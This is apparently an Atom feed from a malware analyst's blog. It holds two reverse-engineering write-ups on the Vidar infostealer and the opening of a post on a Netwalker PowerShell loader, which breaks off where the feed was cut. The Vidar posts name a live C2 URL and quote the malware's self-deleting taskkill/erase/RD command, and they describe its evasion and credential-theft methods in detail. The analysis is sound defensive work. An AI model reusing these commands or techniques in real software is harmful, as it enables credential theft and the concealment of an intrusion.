<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.2.0">Jekyll</generator><link href="/feed.xml" rel="self" type="application/atom+xml" /><link href="/" rel="alternate" type="text/html" /><updated>2022-05-18T04:35:10+05:00</updated><id>/feed.xml</id><title type="html">0x00-0x7F blog</title><subtitle>Malware Analyst and Reverse Engineer</subtitle><entry><title type="html">A Case of Vidar Infostealer - Part 2</title><link href="/A-Case-of-Vidar-Infostealer-Part-2/" rel="alternate" type="text/html" title="A Case of Vidar Infostealer - Part 2" /><published>2022-05-18T00:00:00+05:00</published><updated>2022-05-18T00:00:00+05:00</updated><id>/A-Case-of-Vidar-Infostealer-Part-2</id><content type="html" xml:base="/A-Case-of-Vidar-Infostealer-Part-2/">&lt;p&gt;Hi, welcome to the Part 2 of my Vidar infostealer analysis writeup. In &lt;a href=&quot;https://0x00-0x7f.github.io/A-Case-of-Vidar-Infostealer-Part-1-(-Unpacking-)/&quot;&gt;part 1&lt;/a&gt; of this post, I covered detailed technical analysis of packed executable dropped by initial stager by extracting and exploring embedded shellcode which is unpacking and self-injecting final payload. This part focuses on detailed static analysis of final injected payload: unpacked Vidar infostealer, defying anti-analysis techniques employed by malware (string decryption, dynamically loading DLLs and resolving APIs), automating analysis and finally uncovering stealer’s main functionality through deobfuscated/decrypted strings.&lt;/p&gt;

&lt;p&gt;&lt;b&gt;SHA256:&lt;/b&gt; &lt;a href=&quot;https://bazaar.abuse.ch/sample/fca48ccbf3db60291b49f2290317b4919007dcc4fb943c1136eb70cf998260a5/&quot;&gt;fca48ccbf3db60291b49f2290317b4919007dcc4fb943c1136eb70cf998260a5&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Vidar in a Nutshell&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;The Vidar Stealer is popular stealer written in C++ and has been active since October 2018 and seen in numerous different campaigns. It has been utilized by the threat actors behind GandCrab to use Vidar infostealer in the process for distributing the ransomware as second stage payload, which helps increasing their profits. The family is quite flexible in its operations as it can be configured to grab specific information dynamically. It fetches its configuration
from C2 server at runtime which dictates what features are activated and which information is gathered and exfiltrated from victim machine. It also downloads several benign supporting dlls (freebl3.dll, mozglue.dll, msvcp140.dll and nss3.dll) to process encrypted data from browsers such as email credentials, chat account details, web-browsing cookies, etc., compresses everything into a ZIP archive, and then exfiltrates the archive to the attackers via an HTTP POST request. Once this is done, it kills its own process and deletes the downloaded DLLs and the main executable in an attempt to wipe all evidence of its presence from the victim’s machine.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Technical Analysis&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;I’ll start analysis by loading this executable directly in IDA to look for important strings, IDA’s strings window show some intersting plaintext and base64 encoded strings stored in .rdata section&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/vidar/strings.png&quot; alt=&quot;image&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;

&lt;p&gt;if I quickly decode few base64 strings in Cyberchef, it results in junk data giving a clue that strings are possibly encrypted before they were base64 encoded&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/vidar/cyberchef_base64decod.png&quot; alt=&quot;image&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;

&lt;p&gt;next I’ll check for encryption algorithm but KANAL fails to detect any potential algorithm for string encryption as given in figure below&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/vidar/list_of_algorithms.png&quot; alt=&quot;image&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;

&lt;p&gt;so let’s start digging it statically to see how string encryption actually works in this case, for this purpose I’ll double click a base64 encoded string randomly to see where it’s been used by finding its Xrefs which takes us to &lt;b&gt;sub_423050&lt;/b&gt; routine&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/vidar/wrapper_string_decryption_routine.png&quot; alt=&quot;image&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;

&lt;p&gt;this routine seems to be processing most of the base64 encoded strings and storing result for each processed string in a global variable, apart from first two variables which seem to be storing plaintext values for possible decryption key and domain, let’s rename this routine to &lt;b&gt;wrap_decrypt_strings&lt;/b&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/vidar/decompiled_decrypt_strings.png&quot; alt=&quot;image&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;b&gt;sub_422F70&lt;/b&gt; in &lt;b&gt;wrap_decrypt_strings&lt;/b&gt; routine can be seen from figure above to be repititively called with base64 strings, has been Xref’d for ~400 times, it can be assumed it is processing encrypted strings and can be renamed to &lt;n&gt;decrypt_strings&lt;/n&gt; for our convenience as shown in the figure below&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/vidar/wrapper_renamed_strings.png&quot; alt=&quot;image&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;

&lt;p&gt;further exploring &lt;b&gt;decrypt_strings&lt;/b&gt; by loading the executable in x64dbg, debugging unveils that first two calls to &lt;b&gt;sub_4011C0&lt;/b&gt; routine are just copying values of key and base64 encoded encrypted string to local variables, next routine &lt;b&gt;sub_422D00&lt;/b&gt; is decoding base64 string, stores decoded hex value to a local variable and returns address of this local variable&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/vidar/base64_decoding.png&quot; alt=&quot;image&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;

&lt;p&gt;base64 decoded hex string can also be verified in cyberchef&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/vidar/cyberchef_hex_b64_decode.png&quot; alt=&quot;image&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;

&lt;p&gt;later it calculates length for base64 decoded hex string and allocates buffer equivalent of that length on heap, next two calls to &lt;b&gt;sub_401330&lt;/b&gt; routine are allocating two buffers on heap for key and base64 decoded hex string respectively before it proceeds to finally decrypt data using &lt;b&gt;sub_422980&lt;/b&gt;, quick decompilation of code for this routine results in three well recognized &lt;b&gt;RC4&lt;/b&gt; loops&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/vidar/RC4_decrypt_decompiled.png&quot; alt=&quot;image&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;

&lt;p&gt;string decryption can be confirmed by following Cyberchef recipe&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/vidar/cyberchef_RC4_decrypt.png&quot; alt=&quot;image&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;

&lt;p&gt;decompiled version of &lt;b&gt;decrypt_strings&lt;/b&gt; routine sums up all steps described above&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/vidar/decompiled_decrypt_strings_routine.png&quot; alt=&quot;image&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;

&lt;p&gt;once processing for &lt;b&gt;wrap_decrypt_strings&lt;/b&gt; completes, it continues to process next routine from &lt;b&gt;_WinMain&lt;/b&gt;, a quick overview of &lt;b&gt;sub_419700&lt;/b&gt; this routine reveals that it makes extensive use of global variables which were initialized in &lt;b&gt;wrap_decrypt_strings&lt;/b&gt; apart from two calls to &lt;b&gt;sub_4196D0&lt;/b&gt; and &lt;b&gt;sub_4195A0&lt;/b&gt; routines respectively which can further be explored by debugging&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/vidar/load_kernel32_dll.png&quot; alt=&quot;image&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;

&lt;p&gt;in the figure above, routine &lt;b&gt;sub_4196D0&lt;/b&gt; is parsing PEB structure to get base address for Kernel32.dll loaded in memory by accessing _PEB -&amp;gt; PEB_LDR_DATA -&amp;gt; InLoadOrderModuleList structures respetively, next routine &lt;b&gt;sub_4195A0&lt;/b&gt; being called is taking two parametes: 1). kernel32.dll base address 2). address of a global variable dword_432204 (LoadLibraryA) in first call and dword_432438 (GetProcAddress) in second call&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/vidar/calls.png&quot; alt=&quot;image&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;

&lt;p&gt;where &lt;b&gt;sub_4195A0&lt;/b&gt; is parsing kernel32.dll’s header by navigating from IMAGE_DOS_HEADER -&amp;gt; IMAGE_NT_HEADER -&amp;gt; IMAGE_OPTIONAL_HEADER.DATA_DIRECTORY -&amp;gt; IMAGE_EXPORT_DIRECTORY.AddressOfNames to retrieve export name and compare it with value of API contained by variable which in this case is LoadLibraryA&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/vidar/parse_PE_hdr.png&quot; alt=&quot;image&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;

&lt;p&gt;if both strings match, it returns API’s address by accessing value of IMAGE_EXPORT_DIRECTORY.AddressOfFunctions field, resolved address is stored in &lt;b&gt;dword_432898&lt;/b&gt; variable while second call to &lt;b&gt;sub_4195A0&lt;/b&gt; resolves GetProcAddress, stores resolved address to &lt;b&gt;dword_43280C&lt;/b&gt; which is subsequently used to resolve rest of API functions at runtime. I wrote an IDAPython script &lt;a href=&quot;https://github.com/0x00-0x7F/IDAPython_scripts/blob/master/Vidar/deobfuscate_resolve_Vidar.py&quot;&gt;here&lt;/a&gt; which is first decrypting strings from &lt;b&gt;wrap_decrypt_strings&lt;/b&gt;, resolving APIs from &lt;b&gt;sub_419700&lt;/b&gt; routine, adding comments and giving meaningful names to global variables storing resolved APIs to properly understand code flow and its functionality. decrypt_strings routine from IDAPython script is finding key, locating ~400 base64 encoded encrypted strings, base64 decoding strings and using key to decrypt base64 decoded hex strings, adding decrypted strings as comments and renaming variables as shown in figure below&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/vidar/wrap_decrypt_strings_w_comments.png&quot; alt=&quot;image&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;b&gt;resolve_apis&lt;/b&gt; routine from script is resolving ~100 APIs from 11 libraries from &lt;b&gt;sub_419700&lt;/b&gt; routine&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/vidar/resolved_apis.png&quot; alt=&quot;image&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;

&lt;p&gt;after resolving APIs, next routine &lt;b&gt;sub_41F4A0&lt;/b&gt; checks if victime machine is part of CIS &lt;b&gt;(Commonwealth of Independent States)&lt;/b&gt; countries which include Armenia, Azerbaijan, Belarus, Georgia, Kazakhstan, Kyrgyzstan, Moldova, Russia, Tajikistan, Turkmenistan, Ukraine, and Uzbekistan, it retrieves  language ID for current user by calling GetUserDefaultLangID API and compares returned result with specified location codes&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/vidar/CIS_check.png&quot; alt=&quot;image&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;

&lt;p&gt;where 0x43F corresponds to Kazakhstan, 0x443 to Uzbekistan, 0x82C to Azerbaijan and so on, it continues performing its tasks if user’s language ID doesn’t fall in the above mentioned category, otherwise it’ll stop execution and exit, next routine &lt;b&gt;sub_41B700&lt;/b&gt; performs windows defender anti-emulation check by compareing computer name to &lt;b&gt;HAL9TH&lt;/b&gt; and user name to &lt;b&gt;JohnDoe&lt;/b&gt; strings&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/vidar/anti-emulation_check.png&quot; alt=&quot;image&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;

&lt;p&gt;once all required checks are passed, &lt;b&gt;sub_420BE0&lt;/b&gt; routine is called&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/vidar/download_code_.png&quot; alt=&quot;image&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;

&lt;p&gt;which consists of stealer’s grabbing module, it first prepares urls and destination path strings where downloaded dlls from C2 servers are to be stored, it downloads &lt;b&gt;7&lt;/b&gt; dlls under &lt;b&gt;C:\Programdata&amp;lt;/b&amp;gt;&lt;/b&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/vidar/urls.png&quot; alt=&quot;image&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;

&lt;p&gt;next it creates its working directory under &lt;b&gt;C:\Programdata&lt;/b&gt;, name of directory is randomly generated 15 digit string like &lt;b&gt;C:\ProgramData\920304972255009&lt;/b&gt; where it further creates four sub-directories (autofill, cc, cookies and crypto) which are required to be created to store stolen data from browser, outlook, crypto currency wallets and system information gathering modules&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/vidar/steal_data_.png&quot; alt=&quot;image&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;

&lt;p&gt;different types of browsers are being targeted to steal autofill, credit card, cookies, browsing history and victim’s login credentials, this module is equipped with advanced stealing and encryption techniques&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/vidar/browser_info.png&quot; alt=&quot;image&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;

&lt;p&gt;it further queries registry about SMTP and IMAP servers with confidential data and password, gathers data about connected outlook accounts (if any) and finally dumps all the data to outlook.txt file in its working directory&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/vidar/gather_outlook_data.png&quot; alt=&quot;image&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;

&lt;p&gt;later it scans for .wallet, .seco, .passphrase and .keystore files for &lt;b&gt;~30&lt;/b&gt; cryptocurrency wallets on their installed paths and copies scanned files to “crypto” in working directory&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/vidar/wallets_info.png&quot; alt=&quot;image&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Vidar creates an HTTP POST request for C&amp;amp;C (http://himarkh.xyz/main.php) server in order to download configuration for grabber module at runtime, parses downloaded configuration and proceeds to gather host, hardware and installed software related info&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/vidar/system_info.png&quot; alt=&quot;image&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;

&lt;p&gt;which is stored in system.txt file according to the specified format as shown in figure below&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/vidar/system_hardware_info.png&quot; alt=&quot;image&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;

&lt;p&gt;the same routine also captures screenshots which is stored as “screenshot.jpg” inside working directory&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/vidar/stolen_files_and_dirs.png&quot; alt=&quot;image&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;

&lt;p&gt;immidiately after that a zip file with “_8294024645.zip” name format is created and stolen contents from working directory are compressed (file is compressed using Zip2 encryption algorithm as identified by KANAL)&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/vidar/compressed_zip_file.png&quot; alt=&quot;image&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;

&lt;p&gt;the compressed file is now ready to be exfiltrated to its C&amp;amp;C server in another POST request&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/vidar/create_zip_file.png&quot; alt=&quot;image&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;

&lt;p&gt;after exiting from recursive grabber module, it deletes downloaded DLLs and files fcreated in working directory being used to dump stolen data and information in order to remove its traces from victim machine&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/vidar/delete_files_.png&quot; alt=&quot;image&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;

&lt;p&gt;eventually it prepares a command &lt;b&gt;“/c taskkill /pid PID &amp;amp; erase EXECUTABLE_PATH &amp;amp; RD /S /Q WORKING_DIRECTORY_PATH\* &amp;amp; exit”&lt;/b&gt; which gets executed using cmd.exe to kill the running infostealer process and to delete remaining directories created by this process.&lt;/p&gt;

&lt;p&gt;That’s it for Vidar infostealer’s in-depth static analysis and analysis automation! see you soon in another blogpost.&lt;/p&gt;</content><author><name></name></author><category term="Infostealers" /><summary type="html">Hi, welcome to the Part 2 of my Vidar infostealer analysis writeup. In part 1 of this post, I covered detailed technical analysis of packed executable dropped by initial stager by extracting and exploring embedded shellcode which is unpacking and self-injecting final payload. This part focuses on detailed static analysis of final injected payload: unpacked Vidar infostealer, defying anti-analysis techniques employed by malware (string decryption, dynamically loading DLLs and resolving APIs), automating analysis and finally uncovering stealer’s main functionality through deobfuscated/decrypted strings.</summary></entry><entry><title type="html">A Case of Vidar Infostealer - Part 1 (Unpacking)</title><link href="/A-Case-of-Vidar-Infostealer-Part-1-(-Unpacking-)/" rel="alternate" type="text/html" title="A Case of Vidar Infostealer - Part 1 (Unpacking)" /><published>2022-03-27T00:00:00+05:00</published><updated>2022-03-27T00:00:00+05:00</updated><id>/A-Case-of-Vidar-Infostealer-Part-1-(-Unpacking-)</id><content type="html" xml:base="/A-Case-of-Vidar-Infostealer-Part-1-(-Unpacking-)/">&lt;p&gt;Hi, in this post, I’ll be unpacking and analyzing Vidar infostealer from my &lt;b&gt;BSides Islamabad 2021&lt;/b&gt; talk. Initial stage sample comes as .xll file which is Excel Add-in file extension. It allows third party applications to add extra functionality to Excel using Excel-DNA, a tool or library that is used to write .NET Excel add-ins. In this case, xll file embeds malicious downloader dll which further drops packed Vidar infostealer executable on victim machine, investigating whole infection chain is out of scope for this post, however I’ll be digging deep the dropped executable (Packed Vidar) in Part1 of this blogpost and final infostealer payload in Part2.&lt;/p&gt;

&lt;p&gt;&lt;b&gt;SHA256:&lt;/b&gt; &lt;a href=&quot;https://bazaar.abuse.ch/sample/5cd0759c1e566b6e74ef3f29a49a34a08ded2dc44408fccd41b5a9845573a34c/&quot;&gt;5cd0759c1e566b6e74ef3f29a49a34a08ded2dc44408fccd41b5a9845573a34c&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Technical Analysis&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;I usually start unpacking general malware packers/loaders by looking it first into basic static analysis tools, then opening it into IDA and taking a bird’s eye view of different sections for variables with possible encrypted strings, keys, imports or other global variables containing important information, checking if it has any crypto signatures identified and then start debugging it. After loading it into x64dbg, I first put breakpoint on memory allocation APIs such as LocalAlloc, GlobalAlloc, VirtualAlloc and memory protection API: VirtualProtect, and hit run button to see if any of the breakpoints hits. If yes, then it is fairly simple to unpack it and extract next stage payload, otherwise it might require in-depth static and dynamic analysis. Let’s hit run button to see where it takes us next.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Shellcode Extraction&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;Here we go, the first breakpoint hits in this case, is &lt;b&gt;VirtualProtect&lt;/b&gt;, being called on a &lt;b&gt;stack&lt;/b&gt; memory region of size &lt;b&gt;0x28A&lt;/b&gt; to grant it &lt;b&gt;E&lt;/b&gt;xecute &lt;b&gt;R&lt;/b&gt;ead &lt;b&gt;W&lt;/b&gt;rite (0x40) protection, strange enough right!&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/vidar_packed/virtualprotect.png&quot; alt=&quot;image&quot; class=&quot;img-responsive&quot; /&gt;
&lt;em&gt;Figure1&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;first few opcodes &lt;b&gt;E9&lt;/b&gt;, &lt;b&gt;55&lt;/b&gt;, &lt;b&gt;8B&lt;/b&gt; in dumped data on stack correspond to &lt;b&gt;jmp&lt;/b&gt;, &lt;b&gt;push&lt;/b&gt; and &lt;b&gt;mov&lt;/b&gt; instructions respectively, so it can be assumed it is shellcode being pushed on stack and then granted Execute protection to later execute it, If I hit execute till return button on VirtualProtect and trace back from it into disassembler, I can see shellcode stored as &lt;b&gt;stack strings&lt;/b&gt; right before VirtualProtect call and list of arguments are pushed as shown in the figure below&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/vidar_packed/shellcode_stack_strings.png&quot; alt=&quot;image&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;

&lt;p&gt;following few statements are preparing to execute shellcode on stack by retrieving a handle to a device context (DC) object and passing this handle to GrayStringA to execute shellcode from stack (ptr value in eax taken from Figure1)&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/vidar_packed/shellcode_exec.png&quot; alt=&quot;image&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;

&lt;p&gt;let’s now start exploring the shellcode.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Debugging shellcode to extract final payload&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;As soon as, &lt;b&gt;GrayStringA&lt;/b&gt; executes, it hits on &lt;b&gt;VirtualAlloc&lt;/b&gt; breakpoint set in the debugger, which is being called to reserver/commit 0xAA3CE size of memory with &lt;b&gt;MEM_COMMIT | MEM_RESERVE&lt;/b&gt; (0x3000) memory allocation type&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/vidar_packed/virtualalloc_.png&quot; alt=&quot;image&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;

&lt;p&gt;returning control from &lt;b&gt;VirtualAlloc&lt;/b&gt; and stepping over one more time from ret, leads us to the shellcode, next few statements after VirtualAlloc call are pushing pointer to newly created buffer, size of the buffer and the file handle for currently loaded process on stack to call &lt;b&gt;ReadFile&lt;/b&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/vidar_packed/readfile_handle.png&quot; alt=&quot;image&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;

&lt;p&gt;which reads 0xAA3CE bytes of data from parent process image into the buffer, let’s say it &lt;b&gt;buffer1&lt;/b&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/vidar_packed/buffer1.png&quot; alt=&quot;image&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;

&lt;p&gt;further execution again hits at &lt;b&gt;VirtualAlloc&lt;/b&gt; breakpoint, this time allocating &lt;b&gt;0x14F0&lt;/b&gt; bytes of memory, I’ll now put a write breakpoint in the memory region reserved/committed by second VirtualAlloc API call to see what and how data gets dumped into second buffer, &lt;b&gt;buffer2&lt;/b&gt;. Hitting Run button once more will break at instruction shown in the figure below&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/vidar_packed/copy_loop.png&quot; alt=&quot;image&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;

&lt;p&gt;this loop is copying 0x14F0 bytes of data from a certain offset of buffer1 into buffer2, next few statements are agaian calling VirtualAlloc to allocate another 0x350DE bytes of memory say &lt;b&gt;buffer3&lt;/b&gt;, pushing returned buffer address along with an offset from buffer1 on stack to copy 0x350DE bytes of data from buffer1 into buffer3&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/vidar_packed/buffer3_.png&quot; alt=&quot;image&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;

&lt;p&gt;loop in the following figure is decrypting data copied to buffer2, next push instruction is pushing the buffer3 pointer on stack as an argument of the routine being called from buffer2 address in edx which is supposed to process buffer3 contents&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/vidar_packed/decrypt_buffer2.png&quot; alt=&quot;image&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;

&lt;p&gt;figure below is showing final buffer2 decrypted contents&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/vidar_packed/encrypted_buffer2_.png&quot; alt=&quot;image&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;

&lt;p&gt;stepping into &lt;b&gt;edx&lt;/b&gt; starts executing buffer2 contents, where it seems to push stack strings for kernel32.dll first and then retrieves kernel32.dll handle by parsing PEB (Process Environment Block) structure&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/vidar_packed/PEB_parsing.png&quot; alt=&quot;image&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;

&lt;p&gt;retrieved kernel32.dll handle is passed to next call along with another argument with constant &lt;b&gt;FF7F721A&lt;/b&gt; value, a quick Google search for this constant results in some public sandbox links but not clear what is this exactly about. Let’s dig into it further, stepping over this routine &lt;b&gt;0x0A4E&lt;/b&gt; results in &lt;b&gt;GetModuleFileNameW&lt;/b&gt; API’s resolved address from Kernel32.dll stored in eax which means this routine is meant to resolve hashed APIs&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/vidar_packed/resolved.png&quot; alt=&quot;image&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;

&lt;p&gt;similarly second call resolves &lt;b&gt;7F91A078&lt;/b&gt; hash value to &lt;b&gt;ExitProcess&lt;/b&gt; API, wrapper routine &lt;b&gt;0x0A4E&lt;/b&gt; iterates over library exports and routine &lt;b&gt;0x097A&lt;/b&gt; is computing hash against input export name parameter. Shellcode seems to be using a custom algorithm to hash API, computed hash value is retuned back into &lt;b&gt;eax&lt;/b&gt; which is compared to the input hash value stored at [ebp-4], if both hash values are equal, API is resolved and its address is stored in eax&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/vidar_packed/api_hash_resolve.png&quot; alt=&quot;image&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;

&lt;p&gt;next few instructions write some junk data on stack followed by pushing pointer to buffer3 and total size of buffer3 contents (0x350C0) on stack and execute routine &lt;b&gt;0x0BE9&lt;/b&gt; for decryption - this custom decryption scheme works by processing each byte from buffer3 using repetitive neg, sub, add, sar, shl, not, or and xor set of instructions with hard-coded values in multiple layers, intermediate result is stored in [ebp-1]&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/vidar_packed/routine_decrypt_buffer3.png&quot; alt=&quot;image&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;

&lt;p&gt;and final value overwrites the corresponding buffer3 value at [eax] offset&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/vidar_packed/buffer3_contents_in_decryption.png&quot; alt=&quot;image&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;

&lt;p&gt;once buffer3 contents are decrypted, it continues to resolve other important APIs in next routine &lt;b&gt;0x0FB6&lt;/b&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/vidar_packed/more_api_hashes.png&quot; alt=&quot;image&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;

&lt;p&gt;I wrote a simple POC python script for hashing algorithm implemented by decrypted shellcode which can be found &lt;a href=&quot;https://github.com/0x00-0x7F/RE_tips_and_tricks/blob/master/vidar_packer/api_hash_strings.py&quot;&gt;here&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/vidar_packed/poc_hashing_algorithm.png&quot; alt=&quot;image&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;

&lt;p&gt;after all required APIs have been resolved, it proceeds to create a new process&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/vidar_packed/createProcess.png&quot; alt=&quot;image&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;

&lt;p&gt;using &lt;b&gt;CreateProcessW&lt;/b&gt; in suspended mode&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/vidar_packed/process_created_in_suspended_mode.png&quot; alt=&quot;image&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;

&lt;p&gt;and then final payload is injected into newly created process using SetThreadContext API, &lt;b&gt;CONTEXT&lt;/b&gt; structure for remote thread is set up with ContextFlag and required memory buffers and &lt;b&gt;SetThreadContext&lt;/b&gt; API is called with current thread handle and remote thread CONTEXT structure for code injection&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/vidar_packed/final_injected_payload.png&quot; alt=&quot;image&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;

&lt;p&gt;main process terminates right after launching this process, we can now take a dump of this process to extract final payload.&lt;/p&gt;

&lt;p&gt;That’s it for unpacking! see you soon in the next blogpost covering detailed analysis of Vidar infostealer.&lt;/p&gt;</content><author><name></name></author><category term="Infostealers" /><summary type="html">Hi, in this post, I’ll be unpacking and analyzing Vidar infostealer from my BSides Islamabad 2021 talk. Initial stage sample comes as .xll file which is Excel Add-in file extension. It allows third party applications to add extra functionality to Excel using Excel-DNA, a tool or library that is used to write .NET Excel add-ins. In this case, xll file embeds malicious downloader dll which further drops packed Vidar infostealer executable on victim machine, investigating whole infection chain is out of scope for this post, however I’ll be digging deep the dropped executable (Packed Vidar) in Part1 of this blogpost and final infostealer payload in Part2.</summary></entry><entry><title type="html">Netwalker: from Powershell reflective loader to injected dll</title><link href="/Netwalker-from-Powershell-reflective-loader-to-injected-Dll/" rel="alternate" type="text/html" title="Netwalker: from Powershell reflective loader to injected dll" /><published>2022-02-11T00:00:00+05:00</published><updated>2022-02-11T00:00:00+05:00</updated><id>/Netwalker-:-from-Powershell-reflective-loader-to-injected-Dll</id><content type="html" xml:base="/Netwalker-from-Powershell-reflective-loader-to-injected-Dll/">&lt;p&gt;Hi! I have lately started delving into maliious powershell payloads and came across a really intriguing powershell loader for “&lt;a href=&quot;https://labs.sentinelone.com/netwalker-ransomware-no-respite-no-english-required/&quot;&gt;Netwalker ransomware&lt;/a&gt;”, performing &lt;a href=&quot;https://www.trendmicro.com/vinfo/us/security/news/cybercrime-and-digital-threats/security-101-how-fileless-attacks-work-and-persist-in-systems&quot;&gt;fileless attack&lt;/a&gt;. Fileless techniques enable attackers to directly load and execute malicious binary in memory without actually storing it on disk by abusing available legitimate tools on victim machine. Such threats leave no trace of execution and are capable of evading any traditional security tools. This post thoroughly discusses how first stage powershell script filelessly loads and executes embedded payload 